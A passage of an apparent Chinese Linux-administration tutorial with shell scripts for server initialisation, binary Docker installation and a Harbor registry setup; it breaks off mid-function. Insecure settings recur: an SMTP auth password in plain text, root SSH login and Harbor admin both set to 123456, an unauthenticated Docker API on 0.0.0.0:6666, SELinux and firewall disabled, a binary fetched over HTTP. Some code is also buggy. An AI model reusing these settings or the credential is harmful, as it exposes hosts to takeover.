    call setline(4,"#Author:        liusenbiao")
    call setline(5,"#QQ:            1805336068")
    call setline(6,"#Date:          ".strftime("%Y-%m-%d"))
    call setline(7,"#FileName:      ".expand("%"))
    call setline(8,"#URL:           www.liusenbiao.com/neteagles")
    call setline(9,"#Description:   The test script")
    call setline(10,"#Copyright (C):".strftime("%Y")." All rights reserved")
    call setline(11,"#*********************************************************************************************")
    call setline(12,"")
    endif
endfunc
autocmd BufNewFile * normal G
EOF
    ${COLOR}"${OS_ID} ${OS_RELEASE} vimrc设置完成,请重新系统启动才能生效!"${END}
}

centos_minimal_install(){
    ${COLOR}'开始安装“Minimal安装建议安装软件包”,请稍等......'${END}
    yum -y install gcc make autoconf gcc-c++ glibc glibc-devel pcre pcre-devel openssl openssl-devel systemd-devel zlib-devel vim lrzsz tree tmux lsof tcpdump wget net-tools iotop bc bzip2 zip unzip nfs-utils man-pages &> /dev/null
    ${COLOR}"${OS_ID} ${OS_RELEASE} Minimal安装建议安装软件包已安装完成!"${END}
}

ubuntu_minimal_install(){
    ${COLOR}'开始安装“Minimal安装建议安装软件包”,请稍等......'${END}
    apt -y install iproute2 ntpdate tcpdump telnet traceroute nfs-kernel-server nfs-common lrzsz tree openssl libssl-dev libpcre3 libpcre3-dev zlib1g-dev gcc openssh-server iotop unzip zip
    ${COLOR}"${OS_ID} ${OS_RELEASE} Minimal安装建议安装软件包已安装完成!"${END}
}

minimal_install(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        centos_minimal_install
    else
        ubuntu_minimal_install
    fi
}

set_mail(){                                                                                                 
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        rpm -q mailx &> /dev/null || yum -y install mailx &> /dev/null
        cat >> /etc/mail.rc <<-EOF
set from=1805336068@qq.com
set smtp=smtp.qq.com
set smtp-auth-user=1805336068@qq.com
set smtp-auth-password=mkmzfnyrjkojbgfg
EOF
    else
        dpkg -s mailutils &> /dev/null || apt -y install mailutils
    fi
    ${COLOR}"${OS_ID} ${OS_RELEASE} 邮件设置完成,请重新登录后才能生效!"${END}
}

set_sshd_port(){
    disable_selinux
    disable_firewall
    read -p "请输入端口号:" PORT
    sed -i 's/#Port 22/Port '${PORT}'/' /etc/ssh/sshd_config
    ${COLOR}"${OS_ID} ${OS_RELEASE} 更改SSH端口号已完成，请重启系统后生效!"${END}
}

set_centos_eth(){
    ETHNAME=`ip addr | awk -F"[ :]" '/^2/{print $3}'`
    #修改网卡名称配置文件
    sed -ri.bak '/^GRUB_CMDLINE_LINUX=/s@"$@ net.ifnames=0"@' /etc/default/grub
    grub2-mkconfig -o /boot/grub2/grub.cfg >& /dev/null

    #修改网卡文件名
    mv /etc/sysconfig/network-scripts/ifcfg-${ETHNAME} /etc/sysconfig/network-scripts/ifcfg-eth0
    ${COLOR}"${OS_ID} ${OS_RELEASE} 网卡名已修改成功，请重新启动系统后才能生效!"${END}
}

set_ubuntu_eth(){
    #修改网卡名称配置文件
    sed -ri.bak '/^GRUB_CMDLINE_LINUX=/s@"$@ net.ifnames=0"@' /etc/default/grub
    grub-mkconfig -o /boot/grub/grub.cfg >& /dev/null
    ${COLOR}"${OS_ID} ${OS_RELEASE} 网卡名已修改成功，请重新启动系统后才能生效!"${END}
}

set_eth(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        if [ ${OS_RELEASE_VERSION} == 6 ];then
            ${COLOR}"${OS_ID} ${OS_RELEASE} 不用修改网卡名"${END}
        else
            set_centos_eth
        fi
    else
        set_ubuntu_eth
    fi
}

check_ip(){
    local IP=$1
    VALID_CHECK=$(echo ${IP}|awk -F. '$1<=255&&$2<=255&&$3<=255&&$4<=255{print "yes"}')
    if echo ${IP}|grep -E "^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$" >/dev/null; then
        if [ ${VALID_CHECK} == "yes" ]; then
            echo "IP ${IP}  available!"
            return 0
        else
            echo "IP ${IP} not available!"
            return 1
        fi
    else
        echo "IP format error!"
        return 1
    fi
}

set_centos_ip(){
    while true; do
        read -p "请输入IP地址:"  IP
        check_ip ${IP}
        [ $? -eq 0 ] && break
    done
    while true; do
        read -p "请输入网关地址:"  GATEWAY
        check_ip ${GATEWAY}
        [ $? -eq 0 ] && break
    done
    cat > /etc/sysconfig/network-scripts/ifcfg-eth0 <<-EOF
DEVICE=eth0
NAME=eth0
BOOTPROTO=none
ONBOOT=yes
IPADDR=${IP}
PREFIX=24
GATEWAY=${GATEWAY}
DNS1=223.5.5.5
DNS2=180.76.76.76
EOF
    ${COLOR}"${OS_ID} ${OS_RELEASE} IP地址和网关地址已修改成功,请重新启动系统后生效!"${END}
}

set_ubuntu_ip(){
    while true; do
        read -p "请输入IP地址:"  IP
        check_ip ${IP}
        [ $? -eq 0 ] && break
    done
    while true; do
        read -p "请输入网关地址:"  GATEWAY
        check_ip ${GATEWAY}
        [ $? -eq 0 ] && break
    done
    cat > /etc/netplan/01-netcfg.yaml <<-EOF
network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      addresses: [${IP}/24] 
      gateway4: ${GATEWAY}
      nameservers:
        search: [neteagles.cn, neteagles.com]
        addresses: [223.5.5.5, 180.76.76.76]
EOF
    ${COLOR}"${OS_ID} ${OS_RELEASE} IP地址和网关地址已修改成功,请重新启动系统后生效!"${END}
}

set_ip(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        set_centos_ip
    else
        set_ubuntu_ip
    fi
}

set_hostname_all(){
    read -p "请输入主机名:"  HOST
    hostnamectl set-hostname ${HOST}
    ${COLOR}"${OS_ID} ${OS_RELEASE} 主机名设置成功，请重新登录生效!"${END}
}

set_hostname6(){
    read -p "请输入主机名:"  HOST
    sed -i.bak -r '/^HOSTNAME/s#^(HOSTNAME=).*#\1'${HOST}'#' /etc/sysconfig/network
    ${COLOR}"${OS_ID} ${OS_RELEASE} 主机名设置成功，请重新登录生效!"${END}
}

set_hostname(){
    if [ ${OS_RELEASE_VERSION} == 6 ] &> /dev/null;then
        set_hostname6
    else
        set_hostname_all
    fi
}

set_centos_ps1(){
    TIPS="${COLOR}${OS_ID} ${OS_RELEASE} PS1已设置完成,请重新登录生效!${END}"
    while true;do
        echo -e "\E[$[RANDOM%7+31];1m"
        cat <<-EOF
1)31 红色
2)32 绿色
3)33 黄色
4)34 蓝色
5)35 紫色
6)36 青色
7)随机颜色
8)退出
EOF
        echo -e '\E[0m'

        read -p "请输入颜色编号(1-8)" NUM
        case ${NUM} in
        1)
            echo "PS1='\[\e[1;31m\][\u@\h \W]\\$ \[\e[0m\]'" > /etc/profile.d/env.sh
            ${TIPS}
            ;;
        2)
            echo "PS1='\[\e[1;32m\][\u@\h \W]\\$ \[\e[0m\]'" > /etc/profile.d/env.sh
            ${TIPS}
            ;;
        3)
            echo "PS1='\[\e[1;33m\][\u@\h \W]\\$ \[\e[0m\]'" > /etc/profile.d/env.sh
            ${TIPS}
            ;;
        4)
            echo "PS1='\[\e[1;34m\][\u@\h \W]\\$ \[\e[0m\]'" > /etc/profile.d/env.sh
            ${TIPS}
            ;;
        5)
            echo "PS1='\[\e[1;35m\][\u@\h \W]\\$ \[\e[0m\]'" > /etc/profile.d/env.sh
            ${TIPS}
            ;;
        6)
            echo "PS1='\[\e[1;36m\][\u@\h \W]\\$ \[\e[0m\]'" > /etc/profile.d/env.sh
            ${TIPS}
            ;;
        7)
            echo "PS1='\[\e[1;"$[RANDOM%7+31]"m\][\u@\h \W]\\$ \[\e[0m\]'" > /etc/profile.d/env.sh
            ${TIPS}
            ;;
        8)
            break
            ;;
        *)
            ${COLOR}"输入错误,请输入正确的数字(1-9)!"${END}
            ;;
        esac
    done
}

unsetps1(){
    CURRENTPS1SET=`grep "^PS1.*" ~/.bashrc |cut -d "=" -f 1`
    if [ "${CURRENTPS1SET}" = "PS1" ] ;then
        sed -i "/^PS1.*/d" ~/.bashrc
        echo -e "\e[1;31m已清空PS1设置，请重新设置\e[0m"
    else
        echo -e "\e[1;31m没有设置PS1，请直接设置\e[0m"
    fi
}

set_ubuntu_ps1(){
    TIPS="${COLOR}${OS_ID} ${OS_RELEASE} PS1已设置完成,请重新登录生效!${END}"
    while true;do
        echo -e "\E[$[RANDOM%7+31];1m"
        cat <<-EOF
1)31 红色
2)32 绿色
3)33 黄色
4)34 蓝色
5)35 紫色
6)36 青色
7)随机颜色
8)清空PS1设置
9)退出
EOF
        echo -e '\E[0m'

        read -p "请输入颜色编号(1-9)" NUM
        case ${NUM} in
        1)
            echo 'PS1="\[\e[1;31m\]${debian_chroot:+($debian_chroot)}\u@\h:\w\\$ \[\e[0m\]"' >> ~/.bashrc
            ${TIPS}
            ;;
        2)
            echo 'PS1="\[\e[1;32m\]${debian_chroot:+($debian_chroot)}\u@\h:\w\\$ \[\e[0m\]"' >> ~/.bashrc
            ${TIPS}
            ;;
        3)
            echo 'PS1="\[\e[1;33m\]${debian_chroot:+($debian_chroot)}\u@\h:\w\\$ \[\e[0m\]"' >> ~/.bashrc
            ${TIPS}
            ;;
        4)
            echo 'PS1="\[\e[1;34m\]${debian_chroot:+($debian_chroot)}\u@\h:\w\\$ \[\e[0m\]"' >> ~/.bashrc
            ${TIPS}
            ;;
        5)
            echo 'PS1="\[\e[1;35m\]${debian_chroot:+($debian_chroot)}\u@\h:\w\\$ \[\e[0m\]"' >> ~/.bashrc
            ${TIPS}
            ;;
        6)
            echo 'PS1="\[\e[1;36m\]${debian_chroot:+($debian_chroot)}\u@\h:\w\\$ \[\e[0m\]"' >> ~/.bashrc
            ${TIPS}
            ;;
        7)
            echo 'PS1="\[\e[1;'$[RANDOM%7+31]'m\]${debian_chroot:+($debian_chroot)}\u@\h:\w\\$ \[\e[0m\]"' >> ~/.bashrc
            ${TIPS}
            ;;
        8)
            unsetps1 
            ;;
        9)
            break
            ;;
        *)
            ${COLOR}"输入错误,请输入正确的数字(1-9)!"${END}
            ;;
        esac
    done
}

set_ps1(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        set_centos_ps1
    else
        set_ubuntu_ps1
    fi
}

set_swap(){
    sed -ri 's/.*swap.*/#&/' /etc/fstab
    swapoff -a
    ${COLOR}"${OS_ID} ${OS_RELEASE} 禁用swap成功!"${END}
}

set_kernel(){
    cat > /etc/sysctl.conf <<-EOF
# Controls source route verification
net.ipv4.conf.default.rp_filter = 1
net.ipv4.ip_nonlocal_bind = 1
net.ipv4.ip_forward = 1

# Do not accept source routing
net.ipv4.conf.default.accept_source_route = 0

# Controls the System Request debugging functionality of the kernel
kernel.sysrq = 0

# Controls whether core dumps will append the PID to the core filename.
# Useful for debugging multi-threaded applications.
kernel.core_uses_pid = 1

# Controls the use of TCP syncookies
net.ipv4.tcp_syncookies = 1

# Disable netfilter on bridges.
net.bridge.bridge-nf-call-ip6tables = 0
net.bridge.bridge-nf-call-iptables = 0
net.bridge.bridge-nf-call-arptables = 0

# Controls the default maxmimum size of a mesage queue
kernel.msgmnb = 65536

# # Controls the maximum size of a message, in bytes
kernel.msgmax = 65536

# Controls the maximum shared segment size, in bytes
kernel.shmmax = 68719476736

# # Controls the maximum number of shared memory segments, in pages
kernel.shmall = 4294967296

# TCP kernel paramater
net.ipv4.tcp_mem = 786432 1048576 1572864
net.ipv4.tcp_rmem = 4096        87380   4194304
net.ipv4.tcp_wmem = 4096        16384   4194304
net.ipv4.tcp_window_scaling = 1
net.ipv4.tcp_sack = 1

# socket buffer
net.core.wmem_default = 8388608
net.core.rmem_default = 8388608
net.core.rmem_max = 16777216
net.core.wmem_max = 16777216
net.core.netdev_max_backlog = 262144
net.core.somaxconn = 20480
net.core.optmem_max = 81920


# TCP conn
net.ipv4.tcp_max_syn_backlog = 262144
net.ipv4.tcp_syn_retries = 3
net.ipv4.tcp_retries1 = 3
net.ipv4.tcp_retries2 = 15

# tcp conn reuse
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_tw_recycle = 0
net.ipv4.tcp_fin_timeout = 30
net.ipv4.tcp_timestamps = 0

net.ipv4.tcp_max_tw_buckets = 20000
net.ipv4.tcp_max_orphans = 3276800
net.ipv4.tcp_synack_retries = 1
net.ipv4.tcp_syncookies = 1

# keepalive conn
net.ipv4.tcp_keepalive_time = 300
net.ipv4.tcp_keepalive_intvl = 30
net.ipv4.tcp_keepalive_probes = 3
net.ipv4.ip_local_port_range = 10001    65000

# swap
vm.overcommit_memory = 0
vm.swappiness = 10

#net.ipv4.conf.eth1.rp_filter = 0
#net.ipv4.conf.lo.arp_ignore = 1
#net.ipv4.conf.lo.arp_announce = 2
#net.ipv4.conf.all.arp_ignore = 1
#net.ipv4.conf.all.arp_announce = 2
EOF
    sysctl -p &> /dev/null
    ${COLOR}"${OS_ID} ${OS_RELEASE} 优化内核参数成功!"${END}
}

set_limits(){
    cat >> /etc/security/limits.conf <<-EOF
root     soft   core     unlimited
root     hard   core     unlimited
root     soft   nproc    1000000
root     hard   nproc    1000000
root     soft   nofile   1000000
root     hard   nofile   1000000
root     soft   memlock  32000
root     hard   memlock  32000
root     soft   msgqueue 8192000
root     hard   msgqueue 8192000
EOF
    ${COLOR}"${OS_ID} ${OS_RELEASE} 优化资源限制参数成功!"${END}
}

set_root_login(){
    PASSWORD=123456
    echo ${PASSWORD} |sudo -S sed -ri 's@#(PermitRootLogin )prohibit-password@\1yes@' /etc/ssh/sshd_config
    sudo systemctl restart sshd
    sudo -S passwd root <<-EOF
${PASSWORD}
${PASSWORD}
EOF
    ${COLOR}"${OS_ID} ${OS_RELEASE} root用户登录已设置完成,请重新登录后生效!"${END}
}

ubuntu_remove(){
    apt purge ufw lxd lxd-client lxcfs liblxc-common
    ${COLOR}"${OS_ID} ${OS_RELEASE} 无用软件包卸载完成!"${END}
}

os

PS3="请选择相应的编号(1-21):"
MENU="
禁用SELinux
关闭防火墙
设置软件包仓库
优化SSH
设置系统别名
设置vimrc配置文件
1-6全执行
Minimal安装建议安装软件
安装邮件服务并配置邮件
更改SSH端口号
修改网卡名
修改IP地址和网关地址
设置主机名
设置PS1(请进入选择颜色)
禁用SWAP
优化内核参数
优化资源限制参数
Ubuntu设置root用户登录
Ubuntu卸载无用软件包
重启系统
退出
"

select menu in ${MENU};do
    case ${REPLY} in
    1)
        disable_selinux
        ;;
    2)
        disable_firewall
        ;;
    3)
        set_package_repository
        ;;
    4)
        optimization_sshd
        ;;
    5)
        set_alias
        ;;
    6)
        set_vimrc
        ;;
    7)
        disable_selinux
        disable_firewall
        set_package_repository
        optimization_sshd
        set_alias
        set_vimrc
        ;;
    8)
        minimal_install
        ;;
    9)
        set_mail
        ;;
    10)
        set_sshd_port
        ;;
    11)
        set_eth
        ;;
    12)
        set_ip
        ;;
    13)
        set_hostname
        ;;
    14)
        set_ps1
        ;;
    15)
        set_swap
        ;;
    16)
        set_kernel
        ;;
    17)
        set_limits
        ;;
    18)
        set_root_login
        ;;
    19)
        ubuntu_remove
        ;;
    20)
        reboot
        ;;
    21)
        break
        ;;
    *)
        ${COLOR}"输入错误,请输入正确的数字!"${END}
        ;;
    esac
done
```

### 4.21 一键安装二进制docker脚本

```
#!/bin/bash
#
#**********************************************************************************************
#Author:        liusenbiao
#QQ:            1805336068
#Date:          2022-07-31
#FileName:      install_docker_binary.sh
#System:        适用版本:centos 7/8 & ubuntu 18.04/20.04
#Description:   一键安装二进制docker
#*********************************************************************************************
SRC_DIR=/usr/local/src
COLOR="echo -e \\033[01;31m"
END='\033[0m'
URL='https://mirrors.cloud.tencent.com/docker-ce/linux/static/stable/x86_64/'
DOCKER_FILE=docker-19.03.10.tgz

os(){
    OS_ID=`sed -rn '/^NAME=/s@.*="([[:alpha:]]+).*"$@\1@p' /etc/os-release`
}

check_file (){
    cd ${SRC_DIR}
    rpm -q wget &> /dev/null || yum -y install wget &> /dev/null
    if [ ! -e ${DOCKER_FILE} ];then
        ${COLOR}"缺少${DOCKER_FILE}文件,如果是离线包,请把文件放到${SRC_DIR}目录下"${END}
        ${COLOR}'开始下载DOCKER二进制安装包'${END}
        wget ${URL}${DOCKER_FILE} || { ${COLOR}"DOCKER二进制安装包下载失败"${END}; exit; } 
    else
        ${COLOR}"相关文件已准备好"${END}
    fi
}

install(){ 
    [ -f /usr/bin/docker ] && { ${COLOR}"DOCKER已存在，安装失败"${END};exit; }
    ${COLOR}"开始安装DOCKER..."${END}
    tar xf ${DOCKER_FILE} 
    mv docker/* /usr/bin/
    cat > /lib/systemd/system/docker.service <<-EOF
[Unit]
Description=Docker Application Container Engine
Documentation=https://docs.docker.com
After=network-online.target firewalld.service
Wants=network-online.target

[Service]
Type=notify
# the default is not to use systemd for cgroups because the delegate issues still
# exists and systemd currently does not support the cgroup feature set required
# for containers run by docker
#add label-name and reomote visit functions
ExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock --label="name=docker1-liu" -H tcp://0.0.0.0:6666
ExecReload=/bin/kill -s HUP \$MAINPID
# Having non-zero Limit*s causes performance problems due to accounting overhead
# in the kernel. We recommend using cgroups to do container-local accounting.
LimitNOFILE=infinity
LimitNPROC=infinity
LimitCORE=infinity
# Uncomment TasksMax if your systemd version supports it.
# Only systemd 226 and above support this version.
#TasksMax=infinity
TimeoutStartSec=0
# set delegate yes so that systemd does not reset the cgroups of docker containers
Delegate=yes
# kill only the docker process, not all processes in the cgroup
KillMode=process
# restart the docker process if it exits prematurely
Restart=on-failure
StartLimitBurst=3
StartLimitInterval=60s

[Install]
WantedBy=multi-user.target
EOF
    mkdir -p /etc/docker
    tee /etc/docker/daemon.json <<-'EOF'
{
    "registry-mirrors": [
        "https://h1ea2sza.mirror.aliyuncs.com",
        "https://docker.mirrors.ustc.edu.cn",
        "http://f1361db2.m.daocloud.io",
        "https://registry.docker-cn.com",
        "https://dockerhub.azk8s.cn",
        "https://reg-mirror.qiniu.com",
        "https://hub-mirror.c.163.com",
        "https://mirror.ccs.tencentyun.com"
    ]
}
EOF
    systemctl daemon-reload
    systemctl enable --now docker &> /dev/null
    systemctl is-active docker &> /dev/null && ${COLOR}"Docker 服务启动成功"${END} || { ${COLOR}"Docker 启动失败"${END};exit; }
    docker version && ${COLOR}"Docker 安装成功"${END} || ${COLOR}"Docker 安装失败"${END}
}

set_swap_limit(){
    if [ ${OS_ID} == "Ubuntu" ];then
        ${COLOR}'设置Docker的"WARNING: No swap limit support"警告'${END}
        sed -ri '/^GRUB_CMDLINE_LINUX=/s@"$@ swapaccount=1"@' /etc/default/grub
        update-grub &> /dev/null
        ${COLOR}"10秒后，机器会自动重启"${END}
        sleep 10
        reboot
    fi
}


set_centos_alias(){
    cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/sysconfig/network-scripts"
alias vie0="vim /etc/sysconfig/network-scripts/ifcfg-eth0"
alias vie1="vim /etc/sysconfig/network-scripts/ifcfg-eth1"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
alias rmi="docker images -qa|xargs docker rmi -f"
alias rmc="docker ps -qa|xargs docker rm -f"
EOF
source ~/.bashrc
}


set_ubuntu_alias(){
    cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/netplan"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
EOF
alias rmi="docker images -qa|xargs sudo docker rmi -f"
alias rmc="docker ps -qa|xargs sudo docker rm -f"
sudo source ~/.bashrc
}


set_alias(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        set_centos_alias        
    else
        set_ubuntu_alias
    fi
}

main(){
    os
    check_file
    install
    set_alias
    set_swap_limit
}

main
```

### 4.22 一键安装Harbor私有仓库脚本

```
#!/bin/bash
#
#**********************************************************************************************
#Author:        liusenbiao
#QQ:            1805336068
#Date:          2022-07-31
#FileName:      install_harbor.sh
#System:        适用版本:centos 7/8 & ubuntu 18.04/20.04
#Description:   一键安装Harbor私有仓库
#********************************************************************************************
. /etc/init.d/functions $> /dev/null
set -e
COLOR="echo -e \E[1;32m"
COLOR1="echo -e \E[1;31m"
END="\E[0m"

#ubuntu依赖包
ubuntu_page="
wget
apt-transport-https
ca-certificates
software-properties-common
python2
openssl
"
#centos依赖包
centos_page="
wget
python2
openssl
"
SRC_DIR=/usr/local/src
DOCKER_DIR=/usr/lib/systemd/system/docker.service
DOCKER_CE_URL='https://mirrors.cloud.tencent.com/docker-ce/linux/static/stable/x86_64/'
DOCKER_COMPOSE_URL=http://liusenbiao.cn/download/Docker/Docker_Compose/
DOCKER_FILE=docker-19.03.10.tgz
DOCKER_COMPOSE=docker-compose-Linux-x86_64-1.25.3
HARBOR_URL=https://storage.googleapis.com/harbor-releases/release-1.7.0/
HARBOR_VERSION=harbor-offline-installer-v1.7.6.tgz


#操作系统版本
os(){
OS_ID=`sed -rn '/^NAME=/s@.*="([[:alpha:]]+).*"$@\1@p' /etc/os-release`

}


#安装相关包依赖
install_dependencies() {
    if [[ ${OS_ID} == "CentOS" ]] &> /dev/null;then
	   if [ $ostype1 = 8 ];then
         for PAGE in ${centos_page};do
         rpm -q $PAGE &> /dev/null || yum -y install $PAGE
         done
	     ln -s /usr/bin/python2 /usr/bin/python
	   elif [ $ostype1 = 7 ];then
	     for PAGE in ${centos_page};do
         rpm -q $PAGE &> /dev/null || yum -y install $PAGE
         done
	   fi
    else
       for PAGE in ${ubuntu_page};do
       rpm -q $PAGE &> /dev/null || sudo apt -y install $PAGE
       done
	   ln -s /usr/bin/python2 /usr/bin/python
    fi

}

#检查Docker文件
check_file (){
    cd ${SRC_DIR}
    if [ ! -e ${DOCKER_FILE} ];then
        ${COLOR}"缺少${DOCKER_FILE}文件,如果是离线包,请把文件放到${SRC_DIR}目录下"${END}
        ${COLOR}'开始下载DOCKER二进制安装包'${END}
        sudo wget ${DOCKER_CE_URL}${DOCKER_FILE} || { ${COLOR1}"DOCKER二进制安装包下载失败"${END}; exit; } 
    else
        ${COLOR}"相关文件已准备好"${END}
    fi
}

#安装Docker,适用于ubuntu和centos
install_docker() {
    [ -f /usr/bin/docker ] && { ${COLOR}"DOCKER已存在，安装失败"${END};return; }
    ${COLOR}"开始安装DOCKER..."${END}
    sudo tar xf ${DOCKER_FILE} 
    sudo mv docker/* /usr/bin/
    sudo cat > /lib/systemd/system/docker.service <<-EOF
[Unit]
Description=Docker Application Container Engine
Documentation=https://docs.docker.com
After=network-online.target firewalld.service
Wants=network-online.target

[Service]
Type=notify
# the default is not to use systemd for cgroups because the delegate issues still
# exists and systemd currently does not support the cgroup feature set required
# for containers run by docker
#add label-name and reomote visit functions
ExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock --label="name=docker1-liu" -H tcp://0.0.0.0:6666
ExecReload=/bin/kill -s HUP \$MAINPID
# Having non-zero Limit*s causes performance problems due to accounting overhead
# in the kernel. We recommend using cgroups to do container-local accounting.
LimitNOFILE=infinity
LimitNPROC=infinity
LimitCORE=infinity
# Uncomment TasksMax if your systemd version supports it.
# Only systemd 226 and above support this version.
#TasksMax=infinity
TimeoutStartSec=0
# set delegate yes so that systemd does not reset the cgroups of docker containers
Delegate=yes
# kill only the docker process, not all processes in the cgroup
KillMode=process
# restart the docker process if it exits prematurely
Restart=on-failure
StartLimitBurst=3
StartLimitInterval=60s

[Install]
WantedBy=multi-user.target
EOF
    sudo mkdir -p /etc/docker
    sudo tee /etc/docker/daemon.json <<-'EOF'
{
    "registry-mirrors": [
        "https://h1ea2sza.mirror.aliyuncs.com",
        "https://docker.mirrors.ustc.edu.cn",
        "http://f1361db2.m.daocloud.io",
        "https://registry.docker-cn.com",
        "https://dockerhub.azk8s.cn",
        "https://reg-mirror.qiniu.com",
        "https://hub-mirror.c.163.com",
        "https://mirror.ccs.tencentyun.com"
    ]
}
EOF
    sudo systemctl daemon-reload
    sudo systemctl enable --now docker &> /dev/null
    sudo systemctl is-active docker &> /dev/null && ${COLOR}"Docker 服务启动成功"${END} || { ${COLOR1}"Docker 启动失败"${END};exit; }
    sudo docker version && ${COLOR}"Docker 安装成功"${END} || ${COLOR1}"Docker 安装失败"${END}
}



#解决SWAP报警提示
set_swap_limit(){
    if [ ${OS_ID} == "Ubuntu" ];then
        ${COLOR}'设置Docker的"WARNING: No swap limit support"警告'${END}
       sudo sed -ri '/^GRUB_CMDLINE_LINUX=/s@"$@ swapaccount=1"@' /etc/default/grub
        update-grub &> /dev/null
        #${COLOR}"10秒后，机器会自动重启"${END}
        #sleep 10
        #reboot
    fi
}


#设置别名alias
set_centos_alias(){
    sudo cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/sysconfig/network-scripts"
alias vie0="vim /etc/sysconfig/network-scripts/ifcfg-eth0"
alias vie1="vim /etc/sysconfig/network-scripts/ifcfg-eth1"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
alias rmi="docker images -qa|xargs docker rmi -f"
alias rmc="docker ps -qa|xargs docker rm -f"
EOF
}



#设置别名alias
set_ubuntu_alias(){
    sudo cat >>~/.bashrc <<-EOF
alias cdnet="cd /etc/netplan"
alias scandisk="echo '- - -' > /sys/class/scsi_host/host0/scan;echo '- - -' > /sys/class/scsi_host/host1/scan;echo '- - -' > /sys/class/scsi_host/host2/scan"
EOF
alias rmi="docker images -qa|xargs sudo docker rmi -f"
alias rmc="docker ps -qa|xargs sudo docker rm -f"
}


set_alias(){
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        set_centos_alias        
    else
        set_ubuntu_alias
    fi
}




#安装docker-compose
install_docker_compose(){
      if [ ! -e ${DOCKER_COMPOSE} ];then
	     ${COLOR}'开始下载DOCKER-COMPOSE安装包'${END}
        sudo wget ${DOCKER_COMPOSE_URL}${DOCKER_COMPOSE} || { ${COLOR1}"DOCKER-COMPOSE安装包下载失败"${END}; exit; } 
		sudo cp ${DOCKER_COMPOSE} /usr/bin/
		sudo chmod +x /usr/bin/${DOCKER_COMPOSE}
		sudo ln -s /usr/bin/${DOCKER_COMPOSE} /usr/bin/docker-compose
    elif [ -e ${DOCKER_COMPOSE} ];then
	    #离线安装包已经准备好了
        ${COLOR}"相关文件已准备好"${END}
        sudo cp ${DOCKER_COMPOSE} /usr/bin/
		sudo chmod +x /usr/bin/${DOCKER_COMPOSE}
		sudo ln -s /usr/bin/${DOCKER_COMPOSE} /usr/bin/docker-compose
    else
	   ${COLOR}"DOCKER_COMPOSE安装完成，直接进入下一步安装"${END}
	   return
    fi
}



#centos安或ubuntu安装harbor
install_harbor(){
      if [ ! -e /root/${HARBOR_VERSION} ];then
	     ${COLOR}'开始下载HARBOR二进制安装包'${END}
		 myip=`hostname -I | awk '{print $1}'`
         sudo wget ${HARBOR_URL}${HARBOR_VERSION} || { ${COLOR1}"HARBOR离线安装包下载失败"${END}; exit; } 
         [ -d /apps ] || mkdir /apps/
		 sudo tar xvf ${HARBOR_VERSION} -C /apps/
		 sudo sed -i.bak "s#reg.mydomain.com#${myip}#" /apps/harbor/harbor.cfg
		 sudo sed -i.bak 's/harbor_admin_password = Harbor12345/harbor_admin_password = 123456/' /apps/harbor/harbor.cfg
    else
        ${COLOR}"相关文件已准备好"${END}
		 [ -d /apps ] || mkdir /apps/
		 sudo tar xvf ${HARBOR_VERSION} -C /apps/
		 sudo sed -i "s#reg.mydomain.com#${myip}#" /apps/harbor/harbor.cfg
		 sudo sed -i.bak 's/harbor_admin_password = Harbor12345/harbor_admin_password = 123456/' /apps/harbor/harbor.cfg
    fi
	
	
    #配置服务文件
     sudo cat > /lib/systemd/system/harbor.service <<-EOF
[Unit]
Description=Harbor
After=docker.service systemd-networkd.service systemd-resolved.service
Requires=docker.service
Documentation=http://github.com/vmware/harbor

[Service]
Type=simple
Restart=on-failure
RestartSec=5
ExecStart=/usr/bin/docker-compose -f /apps/harbor/docker-compose.yml up
ExecStop=/usr/bin/docker-compose -f /apps/harbor/docker-compose.yml down

[Install]
WantedBy=multi-user.target
EOF

/apps/harbor/install.sh && ${COLOR}"harbor安装成功"$END || ${COLOR1}"harbor安装失败"$END
sudo systemctl daemon-reload
sudo systemctl enable --now harbor

}

#系统类型
ostype1=`awk -F'"' '/^VERSION_ID/{print $2}' /etc/os-release` 
ostype2=`awk -F'"' '/^NAME/{print $2}' /etc/os-release`

Docker_complete() {

if [[ $ostype2 == "CentOS Linux" ]];then
    if [ $ostype1 = 8 ];then
        docker --version &> /dev/null && action "Docker已安装" || action "亲亲~Docker还未安装哦"
        ${COLOR}"亲亲~奴家正在安装Docker中"${END}
        install_dependencies && check_file && install_docker && set_alias || { ${COLOR1}"DOCKE二进制安装包下载失败"${END}; exit; }
    elif [ $ostype1 = 7 ];then
        docker --version &> /dev/null && action "Docker已安装" || action "亲亲~Docker还未安装哦"
        ${COLOR}"亲亲~奴家正在安装Docker中"${END}
        install_dependencies && check_file && install_docker && set_alias || { ${COLOR1}"DOCKE二进制安装包下载失败"${END}; exit; }
    fi
elif [[ $ostype2 == "Ubuntu" ]];then
        sudo docker --version &> /dev/null && ${COLOR}"Docker已安装"$END || ${COLOR} "亲亲~Docker还未安装哦"$END
        ${COLOR}"亲亲~奴家正在安装Docker中"${END}
        install_dependencies && check_file && install_docker && set_alias && set_swap_limit || { ${COLOR1}"DOCKE二进制安装包下载失败"${END}; exit; }
fi

}



#判断compose是否安装
Docker_compose_complete() {

docker-compose --version &&> /dev/null && ${COLOR}"亲亲~Docker Compose已安装"${END} || ${COLOR1}"亲亲~Docker Compose还未安装哦"${END}
${COLOR}"亲亲~奴家正在安装Docker_compose_中"${END}
